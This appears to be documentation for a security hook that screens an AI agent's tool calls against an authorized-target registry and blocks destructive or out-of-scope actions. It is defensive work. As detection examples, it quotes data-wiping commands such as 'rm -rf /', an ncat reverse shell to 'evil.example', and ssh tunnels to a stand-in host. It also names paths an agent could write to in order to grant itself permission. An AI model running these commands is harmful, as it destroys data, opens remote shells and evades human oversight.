# Hook contract

This repository targets Google Antigravity lifecycle hooks. The authoritative
reference is the vendor documentation:

- <https://antigravity.google/docs/hooks>

Always check that page before adapting the examples: field names and locations
can change between releases.

## Where hooks live

| Scope | File |
|---|---|
| Workspace | `.agents/hooks.json` at the project root |
| Global | `~/.gemini/config/hooks.json` |
| Plugin | `hooks.json` packaged inside an installed plugin |

A hook placed in `~/.gemini/antigravity-cli/settings.json` is **not** loaded.
That is a common reason a hook silently does nothing.

## Events

| Event | Fires | Matcher target |
|---|---|---|
| `SessionStart` | Once per new conversation, before the first model call | ignored |
| `PreToolUse` | Before a tool executes | tool name |
| `PostToolUse` | After a tool completes | tool name |
| `PreInvocation` | Before the model is called | ignored |
| `PostInvocation` | After each model invocation | ignored |
| `Stop` | When the execution loop terminates | ignored |

This repository only uses `PreToolUse`.

## PreToolUse payload (stdin)

```json
{
  "toolCall": {
    "name": "run_command",
    "args": {
      "CommandLine": "curl https://example.com/",
      "Cwd": "/workspace"
    }
  },
  "stepIdx": 19,
  "conversationId": "00000000-0000-0000-0000-000000000000",
  "workspacePaths": ["/workspace"],
  "transcriptPath": "~/.gemini/antigravity/brain/<id>/.system_generated/logs/transcript_full.jsonl",
  "artifactDirectoryPath": "~/.gemini/antigravity/brain/<id>",
  "modelName": "gemini-3.6-flash-medium"
}
```

The gate reads `toolCall.name` and `toolCall.args`. It reads `transcriptPath`
only when transcript auto-capture is explicitly enabled
(`BTG_AUTO_CAPTURE=1`).

### Argument names used per tool

| Tool | Argument holding the text |
|---|---|
| `run_command` | `CommandLine` |
| `manage_task` | `Input` |
| `read_url_content` | `Url` |
| `search_web` | `query` |
| `ask_permission` | `Target` |
| `write_to_file` | `TargetFile` |
| `replace_file_content` | `TargetFile` |
| `multi_replace_file_content` | `TargetFile` |

## Decision output (stdout)

```json
{
  "decision": "force_ask",
  "reason": "No active authorization: example.net is not covered by any program"
}
```

| `decision` | Effect |
|---|---|
| `allow` | Proceed; delegates to the next hook or the default policy |
| `auto_approve` | Approve without prompting, honoring explicit user rules |
| `deny` | Hard block |
| `ask` | Prompt, respecting cached Always-Allow |
| `force_ask` | Prompt every time, ignoring cached Always-Allow |
| `deny_unless_prior_grant` | Deny unless the resource was previously approved |

The gate emits `allow`, `force_ask`, or `deny`. It deliberately does not emit
`auto_approve`, because that would bypass the human decision for out-of-scope
targets.

Run the gate with `--whoami` to print its own path and content hash; every log
line carries a `gate` field with the same hash prefix, so a log tells you which
copy of the gate produced it.

## Handler configuration

```json
{
  "type": "command",
  "command": "python C:/Users/<you>/.gemini/config/hooks/scope_gate_v2.py",
  "timeout": 15
}
```

- `type` currently supports only `command`.
- `command` is required.
- `timeout` is in seconds; the default is 30.

## Matcher

`matcher` is a regular expression evaluated against the tool name:

| Matcher | Matches |
|---|---|
| `""` or `"*"` | Every tool |
| `run_command` | Exactly `run_command` |
| `run_command|view_file` | Either tool |
| `browser_.*` | Every tool starting with `browser_` |

The shipped example matches every tool the gate can reason about. If you add a
tool that carries a URL or host in a different argument, extend
`TARGET_TEXT_TOOLS` in the pinned gate (`hooks/scope_gate_v2.py`) and the
matcher together. `hooks/scope_gate.py` is a deprecated shim that delegates to
the pinned gate; do not add logic there.

## Forced pushes

`git push --force`, `-f`, `git -C <dir> push -f` and the `+refspec` form
(`git push origin +master`) return `force_ask`; `--force-with-lease` and
`--force-if-includes` are the careful forms and pass. Remote history has no clean
undo and a forced push is rare, so the prompt costs nothing. Nothing else about
git is judged by the gate — that is what human review is for.

## Destructive commands

`deny` is for the commands with no undo and no small blast radius: `rm -rf /`,
`~/`, `$HOME` or `/*` — including inside a chain (`cd /tmp && rm -rf / && echo
done`) —, `Remove-Item -Recurse C:\`, `rd /s /q C:\`, `del /f /s /q C:\*`,
volume formats, raw disk writes, fork bombs, `DROP TABLE` and `mkfs`.

The check is not a single regex. Each command segment is parsed with `shlex`
and the resulting argv is judged, so equivalent spellings are the same command:
`rm -r -f /`, `rm --recursive --force /`, `rm -rf "$HOME"`, `rm -rf "${HOME}"`,
`rm -rf -- /` and `rd /q /s C:\` all return `deny`.

Ordinary cleanup still passes: `rm -rf ./build`, `rm -rf /tmp/build`,
`rm --recursive --force /tmp/build`, `rd /s /q C:\temp\junk`. A gate that denies
cleanup is a gate the operator turns off by hand within a day, and then nothing
is checked at all.

## Registry and transcript writes

`write_to_file` (and the `replace_*` variants) to these paths return `deny`,
not `force_ask`:

- `~/.gemini/config/engagements/` — the scope registry the gate reads.
- `~/.gemini/antigravity/brain/<id>/.system_generated/` — transcripts, task
  logs, and other files the gate may consume.

Both are self-authorization paths: a write there lets the agent grant itself
permission. Hook configuration, git hooks, shell profiles, and credential files
remain `force_ask`, because those are a human edit decision.

## Encoded and unfamiliar calls

`powershell -enc <base64>` is decoded (UTF-16LE, what `-EncodedCommand` accepts)
and the text it really runs is judged, so an encoded download is not invisible
to the rules above.

A tool the gate does not know is not automatically allowed: any argument named
like a URL (`Url`, `Uri`, `Link`, `Href`, ...) is judged as a target. That is
what covers `browser_navigate` and plugin browser tools without naming them one
by one. An unknown tool with no such argument is still allowed — the gate judges
targets, not tools.

## Network context

A network tool (`nmap`, `curl`, `ping`, `ssh`, `ncat`, ...) makes the rest of
its command segment a network context: every host-like token after it is
checked, not only the first argument. `ncat -e cmd.exe evil.example 4444`
therefore reports `evil.example`, even though `cmd.exe` comes first. File names
are still filtered, which is why `curl -o out.zip https://...` does not turn
`out.zip` into a target.

For `ssh`, hosts that travel inside option values are also checked: `-J`
(jump host), `-o ProxyJump=...`, `-o ProxyCommand=...`, and the `-L`/`-R`/`-D`
forwarding specs. `ssh -J evil.test.org target` and
`ssh -L 8080:evil.test.org:80 target` are judged against `evil.test.org`.

## Fail-open behavior

If the hook crashes or receives invalid JSON, it returns `allow` and writes the
error to the log. A gate that crashes and blocks every call makes the agent
unusable, which pushes operators to disable it entirely. Failing open keeps the
control in place while surfacing the defect in the log. Set
`BTG_FAIL_CLOSED=1` to return `force_ask` on error instead.

An empty registry returns `force_ask`, not `allow`: a gate with no programs has
nothing to validate against. `BTG_ALLOW_EMPTY=1` is the explicit escape hatch
for a first run.
